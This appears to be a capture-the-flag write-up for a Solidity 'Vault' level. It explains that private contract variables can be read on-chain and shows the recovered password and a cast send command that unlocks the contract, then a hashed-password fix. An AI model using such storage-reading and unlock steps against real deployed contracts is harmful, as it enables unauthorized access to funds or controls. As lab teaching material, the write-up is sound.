# Vault

Unlock the vault to pass the level.

## Vulnerability

In Solidity, private variables are not directly accessible from outside the contract, but they are still visible in the blockchain. This means that while you can't directly retrieve the password from the Vault contract, you can still find it by looking at the transaction that created the contract.

## Attack

```bash
python3.11 get_password.py

Hex password: 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
Plain password: A very strong secret password :)
```

```bash
cast send $CONTRACT_ADDRESS "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
```

## Fix

```bash
contract Vault {
    bool public locked;
    bytes32 private hashedPassword;
    address private owner;

    event Unlocked(address unlocker);

    constructor(bytes32 _hashedPassword) {
        locked = true;
        hashedPassword = _hashedPassword;
        owner = msg.sender;
    }

    function unlock(bytes32 _password) public {
        require(msg.sender == owner, "Only the owner can unlock the vault");
        if (keccak256(abi.encodePacked(_password)) == hashedPassword) {
            locked = false;
            emit Unlocked(msg.sender);
        }
    }
}
```
